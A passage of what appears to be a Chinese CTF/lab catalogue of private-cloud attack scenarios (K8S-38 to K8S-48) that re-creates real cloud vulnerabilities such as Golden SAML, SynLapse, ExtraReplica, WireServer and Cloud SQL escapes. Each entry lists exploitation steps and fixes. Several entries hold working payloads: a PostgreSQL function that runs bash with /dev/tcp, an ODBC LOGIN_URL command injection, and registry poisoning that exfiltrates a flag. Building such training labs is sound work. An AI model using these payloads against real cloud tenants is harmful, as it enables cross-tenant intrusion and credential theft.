+- 六镜头：IDENTITY（信任策略未复检 claim）；BOUNDARY（账号间信任
+  被错误扩大）
+
+**前置知识 / 条件**
+
+- OIDC federation；AssumeRoleWithWebIdentity；trust policy 条件
+
+**利用步骤**
+
+1. 阅读 OIDC IdP 文档，了解 claim 结构（iss/sub/aud）。
+2. 发现信任策略只校验 issuer 不校验 sub/仓库条件。
+3. 伪造/借用合法签发的 JWT（含目标角色 sub），调用 AssumeRoleWithWebIdentity
+   获得角色凭据与 flag。
+4. 终端服务 iam 向 flag-vault 出示OIDC 的 RS256 令牌（含 iss/aud/sub），换成 flag 后回给调用方——明文只在这一步出现。
+
+**Flag**
+
+- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
+- 交付条件：只有 iam 向 flag-vault 出示「OIDC 的 RS256 令牌（含 iss/aud/sub）」（校验模式 `jwt`）时才交付；
+  其它容器、容器环境变量、落地文件与日志里都没有明文。
+- 形态：`flag{k8s-38-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
+- 验收：`python3 scripts/validate-cloud-gate.py k8s-38 <flag>`（gate）+
+  `python3 tests/cloud/run.py k8s-38 <flag>`（参考利用）。
+
+**知识维度**
+
+| 规划维度 | 所需知识 |
+|---|---|
+| 环境与访问 | OIDC issuer, JWT claims, and IAM role federation |
+| 侦察与前置条件 | Issuer/audience/subject claim validation and trust policy inspection |
+| 核心漏洞与利用 | Forge or reuse a token with a mismatched repository claim |
+| 权限、横向或影响 | Cross-repository role assumption |
+| 验证 | Assume the target role and retrieve the flag |
+
+**修复建议**
+
+信任策略必须限定 sub/aud/ref 等条件；对 OIDC token 做完整校验。
+
+[↑ 返回索引](#六k8s私有云场景)
+
+---
+
+<a id="k8s-39"></a>
+
+### K8S-39 · IAM 信任策略 Principal:* → 跨项目接管
+
+| 字段 | 值 |
+|---|---|
+| ID | K8S-39 |
+| 名称 | IAM Trust Policy Principal:* → Cross-Project Takeover |
+| 交付方式 | docker |
+| 难度 | L2 |
+| 技术/CVE | N/A (overly permissive trust policy) |
+| 入口 | `localhost:10612` |
+| 目录 | `scenarios/k8s/cross-account-trust` |
+
+**场景概述**
+
+私有云目标项目的 IAM 角色信任策略使用 `"Principal": "*"` 或过宽主体。
+攻击者枚举角色后从其他项目直接 AssumeRole，读取目标对象的受保护资源。
+
+**教材锚点**
+
+- 案例：跨账号信任滥用（#010 家族）
+- 平面：控制面（IAM）→ 失败边界：账号/身份
+- 六镜头：IDENTITY（信任主体过宽）；DETECTION（AssumeRole 成功
+  在受害者侧不留痕）
+
+**前置知识 / 条件**
+
+- IAM trust policy 主体语义；跨项目 AssumeRole；角色枚举
+
+**利用步骤**
+
+1. 枚举角色名：`GET /roles` 与 `GET /roles/<name>` 可查看脱敏后的
+   信任策略（Principal 与 Condition 结构可见、具体项目被隐藏）。
+2. 用攻击者身份的 AK/SK 调用 AssumeRole，目标为信任策略过宽的角色
+   （如 `CrossAccountRole` 信任本账号 root，或 `AdminRole` 为
+   `Principal:*`）。
+3. 用返回的三段式临时凭据（AccessKeyId / SecretAccessKey /
+   SessionToken）请求私有对象存储（S3-compatible）的 `/flag.txt`。存储服务会向 IAM 校验会话有效性
+   与角色权限；匿名、伪造或权限不足的凭据一律返回 403。
+4. 终端服务 s3 向 flag-vault 出示AssumeRole 得到的三段式临时凭据，换成 flag 后回给调用方——明文只在这一步出现。
+
+**Flag**
+
+- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
+- 交付条件：只有 s3 向 flag-vault 出示「AssumeRole 得到的三段式临时凭据」（校验模式 `session-creds`）时才交付；
+  其它容器、容器环境变量、落地文件与日志里都没有明文。
+- 形态：`flag{k8s-39-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
+- 验收：`python3 scripts/validate-cloud-gate.py k8s-39 <flag>`（gate）+
+  `python3 tests/cloud/run.py k8s-39 <flag>`（参考利用）。
+
+**知识维度**
+
+| 规划维度 | 所需知识 |
+|---|---|
+| 环境与访问 | IAM trust policies and STS-style role assumption |
+| 侦察与前置条件 | Role ARN discovery and Principal/trust condition inspection |
+| 核心漏洞与利用 | Assume a role trusted by Principal:* |
+| 权限、横向或影响 | Cross-project privilege takeover |
+| 验证 | Use the assumed role to read the target flag |
+
+**修复建议**
+
+信任策略限定具体主体与条件；启用外部 ID / 条件键；监控异常 AssumeRole。
+
+[↑ 返回索引](#六k8s私有云场景)
+
+---
+
+<a id="k8s-40"></a>
+
+### K8S-40 · Golden SAML → 内部联邦信任根伪造
+
+| 字段 | 值 |
+|---|---|
+| ID | K8S-40 |
+| 名称 | Golden SAML → Internal Federation Trust Root Compromise |
+| 交付方式 | docker |
+| 难度 | L3 |
+| 技术/CVE | N/A (SAML signing key exposure) |
+| 入口 | `localhost:10613` |
+| 目录 | `scenarios/k8s/golden-saml` |
+
+**场景概述**
+
+企业私有云联合身份依赖内部 SAML IdP，但签名私钥保护不足。
+攻击者取得私钥后可伪造任意用户或角色的断言，登录私有私有云控制面并取得高权限会话。
+
+**教材锚点**
+
+- 案例：Golden SAML（Ch3 T2）
+- 平面：控制面（身份联合）→ 失败边界：身份/信任根
+- 六镜头：IDENTITY（信任根密钥失陷即一切可伪造）；DETECTION
+  （伪造断言与合法登录无异）
+
+**前置知识 / 条件**
+
+- SAML 断言结构与签名；IdP 私钥保护
+
+**利用步骤**
+
+1. 从 SAML IdP 容器/配置中获取签名私钥。
+2. 构造 SAML 断言（NameID=目标管理员），用私钥签名。
+3. 提交断言换取控制面会话，读取 flag。
+4. 终端服务 iam 向 flag-vault 出示用 IdP 私钥伪造的 RS256 断言，换成 flag 后回给调用方——明文只在这一步出现。
+
+**Flag**
+
+- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
+- 交付条件：只有 iam 向 flag-vault 出示「用 IdP 私钥伪造的 RS256 断言」（校验模式 `jwt`）时才交付；
+  其它容器、容器环境变量、落地文件与日志里都没有明文。
+- 形态：`flag{k8s-40-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
+- 验收：`python3 scripts/validate-cloud-gate.py k8s-40 <flag>`（gate）+
+  `python3 tests/cloud/run.py k8s-40 <flag>`（参考利用）。
+
+**知识维度**
+
+| 规划维度 | 所需知识 |
+|---|---|
+| 环境与访问 | SAML assertions, signing keys, and federation |
+| 侦察与前置条件 | SAML IdP key material and role assertion format |
+| 核心漏洞与利用 | Forge a signed SAML assertion with the exposed key |
+| 权限、横向或影响 | Federation trust-root compromise |
+| 验证 | Exchange the forged assertion for the flag-bearing role |
+
+**修复建议**
+
+签名密钥必须 HSM 保护；定期轮换；对断言做 audience/时间窗校验。
+
+[↑ 返回索引](#六k8s私有云场景)
+
+---
+
+<a id="k8s-41"></a>
+
+### K8S-41 · 租户策略绕过：旧版 API 版本
+
+| 字段 | 值 |
+|---|---|
+| ID | K8S-41 |
+| 名称 | Tenant Policy Bypass via Legacy API Version |
+| 交付方式 | docker |
+| 难度 | L3 |
+| 技术/CVE | N/A (SCP-equivalent policy enforcement gap) |
+| 入口 | `localhost:10615` |
+| 目录 | `scenarios/k8s/scp-bypass` |
+
+**场景概述**
+
+私有云用租户策略限制高权限 AssumeRole，但旧版 API 解析路径未执行同一套策略校验。
+攻击者迁移同一请求到旧版 API 后绕过限制，取得管理角色凭据。
+
+**教材锚点**
+
+- 案例：SCP 强制缺口（控制面策略执行不一致）
+- 平面：控制面（策略执行）→ 失败边界：身份/策略
+- 六镜头：MAGIC（策略执行依赖 API 版本路由）；DETECTION（绕过后
+  的调用与正常调用同形）
+
+**前置知识 / 条件**
+
+- SCP 与服务控制策略执行模型；API 版本兼容性
+
+**利用步骤**
+
+1. 用默认版本 AssumeRole AdminRole——被 SCP 拒绝。
+2. 在请求中加入旧版参数 `Version=2010-05-08` 重试。
+3. 旧版路径未执行 SCP 校验，成功获得 AdminRole 凭据与 flag。
+4. 终端服务 iam 向 flag-vault 出示scp-bypass-user 的长期密钥签名，换成 flag 后回给调用方——明文只在这一步出现。
+
+**Flag**
+
+- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
+- 交付条件：只有 iam 向 flag-vault 出示「scp-bypass-user 的长期密钥签名」（校验模式 `sigv4`）时才交付；
+  其它容器、容器环境变量、落地文件与日志里都没有明文。
+- 形态：`flag{k8s-41-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
+- 验收：`python3 scripts/validate-cloud-gate.py k8s-41 <flag>`（gate）+
+  `python3 tests/cloud/run.py k8s-41 <flag>`（参考利用）。
+
+**知识维度**
+
+| 规划维度 | 所需知识 |
+|---|---|
+| 环境与访问 | Service control policies and cloud API versions |
+| 侦察与前置条件 | Policy evaluation and legacy API version behavior |
+| 核心漏洞与利用 | Call the API version outside SCP enforcement |
+| 权限、横向或影响 | Organization-level control-plane restriction bypass |
+| 验证 | Perform the restricted operation and collect the flag |
+
+**修复建议**
+
+策略执行必须在所有 API 版本路径上一致；废弃旧版端点或统一鉴权
+中间件。
+
+[↑ 返回索引](#六k8s私有云场景)
+
+---
+
+<a id="k8s-42"></a>
+
+### K8S-42 · 托管笔记本前端 → 跨租户代码执行
+
+| 字段 | 值 |
+|---|---|
+| ID | K8S-42 |
+| 名称 | Managed Notebook Front-End → Cross-Tenant RCE |
+| 交付方式 | docker |
+| 难度 | L2 |
+| 技术/CVE | N/A (forwardingId authz bypass, case #073) |
+| 入口 | `localhost:10623` |
+| 目录 | `scenarios/k8s/cosmiss-notebook` |
+
+**场景概述**
+
+私有云托管 notebook 前端验证租户 token，却没有把 token 租户与 notebook 属主绑定。
+攻击者使用本租户有效 token 将请求路由到其他租户的运行实例并执行代码。
+
+**教材锚点**
+
+- 案例：Azure Cosmos DB Notebook forwardingId 授权绕过（CosMiss，#073）
+- 平面：数据面（notebook 前端）→ 失败边界：命名空间 / 账号
+- 六镜头：IDENTITY（前端从不复检调用者身份）；SHARED（前端是多租户共享组件）；
+  DETECTION（对 notebook 的访问不产生租户审计）
+
+**前置知识 / 条件**
+
+- 托管 notebook 服务的基本模型（前端路由 + 每租户一个执行容器）
+- "非机密标识符被当作访问凭据"（security by obscurity）
+
+**利用步骤**
+
+1. 从 `/auth/token` 获取 tenant-a 会话 token，再访问入口页 `/`，发现"Shared notebook"链接，提取其中的 forwardingId：
+   `fwd-8c1d4e5f-6a2b-4c3d-8e9f-000000000002`
+2. 携带 tenant-a token 用该 ID 调用执行端点（服务端只验签、不校验 token tenant 与 notebook 属主）：
+   `GET /notebook/<fwd>/exec?code=print(open('/flag.txt').read())`
+3. 返回 victim 租户 notebook 中的 flag。
+4. 终端服务 nb-b 向 flag-vault 出示笔记本运行时地址（flag 落成 /flag.txt 后即删），换成 flag 后回给调用方——明文只在这一步出现。
+
+**Flag**
+
+- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
+- 交付条件：只有 nb-b 向 flag-vault 出示「笔记本运行时地址（flag 落成 /flag.txt 后即删）」（校验模式 `network-source`）时才交付；
+  其它容器、容器环境变量、落地文件与日志里都没有明文。
+- 形态：`flag{k8s-42-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
+- 验收：`python3 scripts/validate-cloud-gate.py k8s-42 <flag>`（gate）+
+  `python3 tests/cloud/run.py k8s-42 <flag>`（参考利用）。
+
+**知识维度**
+
+| 规划维度 | 所需知识 |
+|---|---|
+| 环境与访问 | Managed notebook frontend routing and tenant notebooks |
+| 侦察与前置条件 | forwardingId format and tenant-to-notebook routing behavior |
+| 核心漏洞与利用 | Replace forwardingId to target a co-tenant notebook |
+| 权限、横向或影响 | Cross-tenant notebook execution |
+| 验证 | Run the routed command and capture the flag |
+
+**修复建议**
+
+前端路由必须校验调用者身份（Authorization token），且执行端点不能暴露
+给非属主租户；forwardingId 不应作为访问凭据。
+
+[↑ 返回索引](#六k8s私有云场景)
+
+---
+
+<a id="k8s-43"></a>
+
+### K8S-43 · 托管 PostgreSQL FDW → 平台内部凭据读取
+
+| 字段 | 值 |
+|---|---|
+| ID | K8S-43 |
+| 名称 | Managed PostgreSQL FDW Host File Read → Platform Credentials |
+| 交付方式 | docker |
+| 难度 | L3 |
+| 技术/CVE | N/A (log_fdw path traversal, case #015) |
+| 入口 | `localhost:10624` |
+| 目录 | `scenarios/k8s/rds-logfdw` |
+
+**场景概述**
+
+私有云托管 PostgreSQL 预装 log_fdw，但 `filename` 参数可越出日志目录读取宿主机文件。
+攻击者得到平台运营方内部服务凭据，并进一步访问内部 API。
+
+**教材锚点**
+
+- 案例：AWS RDS PostgreSQL log_fdw 任意文件读（#015）
+- 平面：数据面（SQL）→ 失败边界：宿主机 VM
+- 六镜头：BOUNDARY（真正的边界是宿主 VM 而非 SQL 授权）；
+  IDENTITY（读到的是宿主机上 provider 内部身份）；DETECTION（DB 查询日志
+  可见，但宿主文件读取在宿主层不可见）
+
+**前置知识 / 条件**
+
+- PostgreSQL 扩展机制：CREATE SERVER / CREATE FOREIGN TABLE
+- 托管数据库模型：客户拿到数据库角色，永远没有宿主 OS 账号
+
+**利用步骤**
+
+1. 在控制台执行（`file_fdw` 已预置）：
+   ```sql
+   CREATE SERVER log_server FOREIGN DATA WRAPPER file_fdw;
+   CREATE FOREIGN TABLE demo (t text) SERVER log_server
+     OPTIONS (filename '/rdsdbdata/config/grover_volume.conf');
+   SELECT * FROM demo;
+   ```
+2. 读出宿主机上的平台运营方配置文件——里面是**内部凭据**（不再是明文 flag）。控制台（托管引擎）
+   随即用这份凭据向 flag-vault 换取第一枚 flag 并补进同一响应。
+3. 用同一份内部凭据（`Authorization: Bearer grover-internal-credential-token`）经控制面
+   `/fetch` 调内部 API：`/fetch?url=http://internal-api:5000/api&auth=grover-internal-credential-token`，
+   换取第二枚 flag。
+
+**Flag**
+
+- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
+- 交付条件：只有 console + internal-api 向 flag-vault 出示「平台运营方内部凭据（宿主文件里那份）」（校验模式 `header-secret`）时才交付；
+  其它容器、容器环境变量、落地文件与日志里都没有明文。
+- 形态：`flag{k8s-43-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
+- 验收：`python3 scripts/validate-cloud-gate.py k8s-43 <flag>`（gate）+
+  `python3 tests/cloud/run.py k8s-43 <flag>`（参考利用）。
+
+**知识维度**
+
+| 规划维度 | 所需知识 |
+|---|---|
+| 环境与访问 | PostgreSQL log_fdw and managed database host files |
+| 侦察与前置条件 | Foreign-table log path behavior and platform internal file locations |
+| 核心漏洞与利用 | Use log_fdw path traversal/file read |
+| 权限、横向或影响 | Platform-internal credential disclosure |
+| 验证 | Read the internal credential or flag file |
+
+**修复建议**
+
+FDW 的 filename 必须白名单限制在日志目录；宿主上不允许存放可被
+数据库引擎进程读取的平台运营方内部凭据。
+
+[↑ 返回索引](#六k8s私有云场景)
+
+---
+
+<a id="k8s-44"></a>
+
+### K8S-44 · 托管 PostgreSQL 引擎补丁 → 平台角色宿主执行
+
+| 字段 | 值 |
+|---|---|
+| ID | K8S-44 |
+| 名称 | Managed PostgreSQL Engine Patch: Index Function Runs as Platform Role → Host RCE |
+| 交付方式 | docker |
+| 难度 | L3 |
+| 技术/CVE | N/A (ATExecChangeOwner patch + ANALYZE, case #052) |
+| 入口 | `localhost:10625` |
+| 目录 | `scenarios/k8s/cloudsql-index-rce` |
+
+**场景概述**
+
+平台运营方定制的 PostgreSQL 引擎允许租户管理员把表属主改为平台超级角色，
+而 ANALYZE 会以表属主身份重新求值索引表达式。攻击者串联两步后以平台角色在数据库主机执行命令。
+
+**教材锚点**
+
+- 案例：GCP Cloud SQL 逃逸到宿主（#052）
+- 平面：数据面（SQL）→ 宿主 RCE → 失败边界：宿主机
+- 六镜头：MAGIC（供应商对引擎的补丁代码是攻击面）；
+  IDENTITY（索引函数继承表属主身份）
+
+**前置知识 / 条件**
+
+- PostgreSQL：索引表达式、ANALYZE、表属主、VOLATILE/IMMUTABLE 函数
+- 托管数据库角色阶梯：客户角色 < 平台超级角色 < 宿主 OS
+
+> 边界说明：`cloudsqluser` 不是超级用户，直接执行
+> `COPY ... FROM PROGRAM` 或读取宿主文件会被拒绝；以下漏洞链是唯一
+> 能以平台运营方角色执行命令的路径。
+
+**利用步骤**
+
+1. 建表并建一个无害的 IMMUTABLE 函数和索引（让索引合法建立）：
+   ```sql
+   CREATE TABLE temp_table (data text);
+   INSERT INTO temp_table VALUES ('dummy');
+   CREATE FUNCTION suid(text) RETURNS text IMMUTABLE
+     AS 'SELECT ''nothing''' LANGUAGE sql;
+   CREATE INDEX idx_malicious ON temp_table (suid(data));
+   ```
+2. 把表属主改成平台超级角色（引擎补丁允许）：
+   ```sql
+   ALTER TABLE temp_table OWNER TO cloudsqladmin;
+   ```
+3. 把函数体换成 VOLATILE 宿主命令。由于索引函数会以 platform 超级角色在数据库主机上执行，
+   直接在主机上向 flag-vault 取密文（`$p$` 引用避免与外层 `$$` 撞标签）：
+   ```sql
+   CREATE OR REPLACE FUNCTION suid(text) RETURNS text VOLATILE AS
+     $$ COPY public.shell_commands_results (data) FROM PROGRAM
+        $p$bash -c "exec 3<>/dev/tcp/flag-vault/5000; printf 'GET /flag HTTP/1.0
+
+' >&3; timeout 5 cat <&3"$p$;
+        SELECT 'done' $$ LANGUAGE sql;
+   ```
+4. 触发 `ANALYZE public.temp_table;`——控制台以 cloudsqladmin 身份重新求值索引函数，命令输出写入
+   `shell_commands_results`。
+5. `SELECT * FROM shell_commands_results;` 得到密文。
+
+**Flag**
+
+- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
+- 交付条件：只有 数据库主机 向 flag-vault 出示「数据库主机地址（platform 超级角色在主机上执行取回）」（校验模式 `network-source`）时才交付；
+  其它容器、容器环境变量、落地文件与日志里都没有明文。
+- 形态：`flag{k8s-44-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
+- 验收：`python3 scripts/validate-cloud-gate.py k8s-44 <flag>`（gate）+
+  `python3 tests/cloud/run.py k8s-44 <flag>`（参考利用）。
+
+**知识维度**
+
+| 规划维度 | 所需知识 |
+|---|---|
+| 环境与访问 | PostgreSQL indexes, functions, ANALYZE, and managed roles |
+| 侦察与前置条件 | Table ownership mutation and platform-role execution semantics |
+| 核心漏洞与利用 | Chain owner change with a malicious index expression function |
+| 权限、横向或影响 | Platform-role to host command execution |
+| 验证 | Query shell command results to retrieve the host flag |
+
+**修复建议**
+
+客户角色不允许改表属主为平台运营方角色；ANALYZE 不得以表属主身份执行
+任意函数；宿主命令执行能力必须从引擎层剥离。
+
+[↑ 返回索引](#六k8s私有云场景)
+
+---
+
+<a id="k8s-45"></a>
+
+### K8S-45 · 共享集成运行时 → 跨租户凭据
+
+| 字段 | 值 |
+|---|---|
+| ID | K8S-45 |
+| 名称 | Shared Integration Runtime → Cross-Tenant Credentials |
+| 交付方式 | docker |
+| 难度 | L3 |
+| 技术/CVE | N/A (ODBC driver injection, CVE-2022-29972 lineage, case #062) |
+| 入口 | `localhost:10626` |
+| 目录 | `scenarios/k8s/synlapse-ir` |
+
+**场景概述**
+
+私有云数据集成控制面把租户管道放入共享运行时，捆绑 ODBC 驱动对 `LOGIN_URL` 做 shell 拼接。
+攻击者选择共享运行时后，在 worker 上执行任意命令并读取其他租户驻留内存的凭据。
+
+**教材锚点**
+
+- 案例：SynLapse / CVE-2022-29972（#062）
+- 平面：数据面 worker → 失败边界：命名空间（共享池）
+- 六镜头：SHARED（共享 IR 是爆炸半径）；MAGIC（捆绑驱动的便利即攻击面）；
+  DETECTION（客户看不到 worker 内部执行）
+
+**前置知识 / 条件**
+
+- 集成运行时 / ETL worker 模型；ODBC 连接字符串注入
+- "运行时归属只由客户端声明"（服务端不校验）
+
+**利用步骤**
+
+1. 查看控制面文档，确认存在共享运行时 `AutoResolveIntegrationRuntime`。
+2. 构造恶意连接字符串，在 `LOGIN_URL` 里放 shell 命令：先 dump 同机 co-tenant 凭据，
+   再从共享运行时自己的内网地址向 flag-vault 取密文：
+   `LOGIN_URL={cat /app/memory.json; python3 -c "import urllib.request;print(urllib.request.urlopen('http://flag-vault:5000/flag').read().decode())";}`
+3. 以 `runtime_name=AutoResolveIntegrationRuntime` 提交管道。
+4. 共享 worker 执行注入命令，返回 co-tenant 凭据与平台运营方密文。
+
+**Flag**
+
+- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
+- 交付条件：只有 共享集成运行时 向 flag-vault 出示「共享运行时地址（注入的命令直达 vault）」（校验模式 `network-source`）时才交付；
+  其它容器、容器环境变量、落地文件与日志里都没有明文。
+- 形态：`flag{k8s-45-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
+- 验收：`python3 scripts/validate-cloud-gate.py k8s-45 <flag>`（gate）+
+  `python3 tests/cloud/run.py k8s-45 <flag>`（参考利用）。
+
+**知识维度**
+
+| 规划维度 | 所需知识 |
+|---|---|
+| 环境与访问 | Data integration control plane, shared runtime, and ODBC |
+| 侦察与前置条件 | Runtime selection and connection-string handling |
+| 核心漏洞与利用 | Send an ODBC driver/LOGIN_URL injection to the shared runtime |
+| 权限、横向或影响 | Co-tenant credential disclosure from shared execution |
+| 验证 | Read the shared runtime result/flag |
+
+**修复建议**
+
+IR 节点必须专用、临时、单租户（修复后架构）；捆绑驱动的连接字符串
+参数必须白名单过滤；worker 内存不得驻留跨租户凭据；管理凭据应短时效。
+
+[↑ 返回索引](#六k8s私有云场景)
+
+---
+
+<a id="k8s-46"></a>
+
+### K8S-46 · 托管数据库内部子网 + 证书 CN 校验缺陷
+
+| 字段 | 值 |
+|---|---|
+| ID | K8S-46 |
+| 名称 | Managed DB Internal Subnet + CN Validation Bypass |
+| 交付方式 | docker |
+| 难度 | L3 |
+| 技术/CVE | N/A (internal subnet + mis-anchored cert regex, case #061) |
+| 入口 | `localhost:10627` |
+| 目录 | `scenarios/k8s/extrareplica-repl` |
+
+**场景概述**
+
+私有云托管数据库实例共享平台内部子网，防火墙只覆盖外部访问路径；
+同时复制用户接受内部 CA 证书，但 CN 校验正则未锚定尾部。攻击者可申请带合法前缀的
+客户端证书，从内部网络发起跨租户流复制。
+
+**教材锚点**
+
+- 案例：ExtraReplica 跨账号数据库漏洞（#061）
+- 平面：数据面（复制协议）→ 失败边界：网络 + 身份
+- 六镜头：BOUNDARY（防火墙只管公网路径，内部子网是软边界）；
+  IDENTITY（CN 正则未锚定）；DETECTION（流复制在数据库审计之外）
+
+**前置知识 / 条件**
+
+- PostgreSQL 流复制 / pg_basebackup；pg_hba cert 认证
+- 内部子网与公网防火墙的边界模型
+
+**利用步骤**
+
+1. Step 1：侦察自己的托管实例网络，确认与受害者共享内部子网 `10.0.0.0/24`，
+   公网防火墙不覆盖该路径。
+2. Step 2：向内部 CA 申请客户端证书，CN 为
+   `replication.<victim-id>.database.azure.com.attacker.example`（尾部后缀，CA 的正则允许）。
+3. Step 3：以复制用户身份 `pg_basebackup` 拉走受害者整库——得到的是同租户的轮换令牌，
+   不是明文 flag。
+4. 用同一张内部 CA 签发的客户端证书（`X-Client-Cert`）向 flag-vault 换取密文：证书是这个
+   终点的唯一凭据，pg_basebackup 只证明你已经越过了内网与证书两道边界。
+
+**Flag**
+
+- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
+- 交付条件：只有 租户控制台 向 flag-vault 出示「内部 CA 签发、CN 形如 replication.<id>… 的客户端证书」（校验模式 `mtls`）时才交付；
+  其它容器、容器环境变量、落地文件与日志里都没有明文。
+- 形态：`flag{k8s-46-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
+- 验收：`python3 scripts/validate-cloud-gate.py k8s-46 <flag>`（gate）+
+  `python3 tests/cloud/run.py k8s-46 <flag>`（参考利用）。
+
+**知识维度**
+
+| 规划维度 | 所需知识 |
+|---|---|
+| 环境与访问 | PostgreSQL replication, mutual TLS, internal networks, and X.509 |
+| 侦察与前置条件 | Internal subnet trust and CA CN regex behavior |
+| 核心漏洞与利用 | Obtain a certificate with a regex-bypass CN and start replication |
+| 权限、横向或影响 | Cross-tenant database replication |
+| 验证 | Read replicated victim data/flag |
+
+**修复建议**
+
+内部子网也必须有租户级网络隔离；证书 CN 正则必须锚定末尾；复制用户
+不应信任"看起来像内部来源"的连接。
+
+[↑ 返回索引](#六k8s私有云场景)
+
+---
+
+<a id="k8s-47"></a>
+
+### K8S-47 · K8s 宿主代理通道 → 节点引导密钥窃取
+
+| 字段 | 值 |
+|---|---|
+| ID | K8S-47 |
+| 名称 | K8s Host-Agent Channel → Node Bootstrap Secrets |
+| 交付方式 | docker |
+| 难度 | L3 |
+| 技术/CVE | N/A (unvalidated transport cert, case #255/#184) |
+| 入口 | `localhost:10628` |
+| 目录 | `scenarios/k8s/wireserver-bootstrap` |
+
+**场景概述**
+
+私有云 K8s 节点上的普通 pod 可以访问宿主代理通道。goalstate 缺少认证，
+证书端点信任调用方公钥，扩展配置也可被调用方解密。攻击者据此取得节点引导凭据并伪造节点身份。
+
+**教材锚点**
+
+- 案例：WireServing（#255）；WireServer 扩展设置解密（#184）
+- 平面：控制面通道（guest→host agent）→ 失败边界：网络
+- 六镜头：MAGIC（引导自动化以高权限运行）；SHARED（host agent 是所有
+  VM 的共享组件）；DETECTION（网络策略未覆盖 host-agent IP）
+
+**前置知识 / 条件**
+
+- private-cloud K8s host agent / HostGAPlugin 协议；VM 扩展 protectedSettings
+- Kubernetes TLS bootstrap（CSR 自动签发）
+
+**利用步骤**
+
+1. 从 pod 内 GET `http://168.63.129.16/machine/?comp=goalstate`（无鉴权）。
+2. 生成自签传输证书，放入 `x-ms-guest-agent-public-x509-cert` 头请求
+   `/certs`；服务端把密钥包加密到该公钥，用自己私钥解密得到
+   TenantEncryptionCert。
+3. 请求 `/vmSettings`，用 TenantEncryptionCert 解密 protectedSettings，
+   得到 `TLS_BOOTSTRAP_TOKEN` 与 flag。
+4. 用 bootstrap token 向控制面提交 CSR（CN=system:node:*）——自动签发。
+5. 以伪造的 node 身份读取 `/node-secrets`，拿到最终 flag。
+6. 终端服务 Wireserver / 控制面 向 flag-vault 出示两个内部服务地址，各取自己那枚 flag，换成 flag 后回给调用方——明文只在这一步出现。
+
+**Flag**
+
+- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
+- 交付条件：只有 Wireserver / 控制面 向 flag-vault 出示「两个内部服务地址，各取自己那枚 flag」（校验模式 `network-source`）时才交付；
+  其它容器、容器环境变量、落地文件与日志里都没有明文。
+- 形态：`flag{k8s-47-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
+- 验收：`python3 scripts/validate-cloud-gate.py k8s-47 <flag>`（gate）+
+  `python3 tests/cloud/run.py k8s-47 <flag>`（参考利用）。
+
+**知识维度**
+
+| 规划维度 | 所需知识 |
+|---|---|
+| 环境与访问 | private-cloud K8s host agent, X.509, RSA-OAEP, and AES-GCM |
+| 侦察与前置条件 | Unauthenticated goalstate and caller-supplied transport certificate handling |
+| 核心漏洞与利用 | Supply an attacker certificate, unwrap the secret bundle, and decrypt settings |
+| 权限、横向或影响 | Node bootstrap secret theft and node identity forgery |
+| 验证 | Use the recovered bootstrap material to obtain the node flag |
+
+**修复建议**
+
+网络策略必须阻止 pod 访问 host-agent IP；host agent 必须校验传输证书
+归属；扩展密钥按节点短时效轮换。
+
+[↑ 返回索引](#六k8s私有云场景)
+
+---
+
+<a id="k8s-48"></a>
+
+### K8S-48 · 内部构建舰队 + 私有镜像仓库供应链
+
+| 字段 | 值 |
+|---|---|
+| ID | K8S-48 |
+| 名称 | Internal Build Fleet + Private Registry Supply-Chain Overwrite |
+| 交付方式 | docker |
+| 难度 | L2 |
+| 技术/CVE | N/A (unauth internal registry, case #260 lineage) |
+| 入口 | `localhost:10629` |
+| 目录 | `scenarios/k8s/buildfleet-registry` |
+
+**场景概述**
+
+平台运营方的共享构建舰队执行租户 Dockerfile，私有镜像仓库却缺少鉴权和项目隔离。
+攻击者先借构建任务读取平台秘密，再覆盖受害者镜像标签，在下次拉取时完成供应链代码执行。
+
+**教材锚点**
+
+- 案例：内部 ACR 可写（#260）；HF Spaces 构建舰队注册表（Ch10）
+- 平面：控制面（构建/注册表）→ 失败边界：命名空间 / 供应链
+- 六镜头：MAGIC（构建自动化以高权限运行）；SHARED（构建舰队与内部
+  registry 是所有租户共享的）；IDENTITY（registry 不校验调用者身份）
+
+**前置知识 / 条件**
+
+- 托管 CI 构建模型；镜像供应链（registry 投毒）
+
+**利用步骤**
+
+1. 提交恶意 Dockerfile 到 `/build`，RUN 读取构建机环境变量
+   （`$BUILD_SECRET`）证明在平台运营方构建机上执行。
+2. 列出内部 registry（`GET /images`），发现 `victim-app:latest`。
+3. `PUT /images/victim-app:latest` 用恶意脚本覆盖（无鉴权），脚本用
+   python urllib 把 `/flag.txt` 外发到攻击者 `/exfil`。
+4. 触发受害者工作负载 `/pull`——它执行被覆盖的镜像内容，攻击者收到
+   外发的 flag。
+5. 终端服务 租户工作负载 向 flag-vault 出示工作负载地址（拉镜像时下发密文，运行完即删），换成 flag 后回给调用方——明文只在这一步出现。
+
+**Flag**
+
+- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
+- 交付条件：只有 租户工作负载 向 flag-vault 出示「工作负载地址（拉镜像时下发密文，运行完即删）」（校验模式 `network-source`）时才交付；
+  其它容器、容器环境变量、落地文件与日志里都没有明文。
+- 形态：`flag{k8s-48-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
